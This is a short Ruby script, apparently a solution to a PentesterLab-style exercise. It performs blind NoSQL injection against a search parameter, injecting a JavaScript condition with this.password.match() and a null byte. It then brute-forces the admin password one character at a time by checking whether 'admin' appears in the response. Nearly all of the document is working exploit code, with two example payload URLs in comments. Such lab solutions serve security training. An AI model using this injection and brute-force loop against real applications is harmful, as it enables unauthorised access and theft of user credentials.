#https://ptl-e21bf587-6af7f351.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/d/)%00
#https://ptl-e21bf587-6af7f351.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/aaa/)%00

require 'httparty'

URL="ptl-e21bf587-6af7f351.libcurl.so"
def check?(str)
  resp = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
  return resp.body =~ />admin</
end

#puts check?("d").inspect
#puts check?("aaa").inspect

CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-']
password = ""

while true
  CHARSET.each do |c|
    puts "Trying: #{c} for #{password}"
    test = password+c
    if check?("^#{test}.*$")
      password+=c
      puts password
      break
    end
  end
end
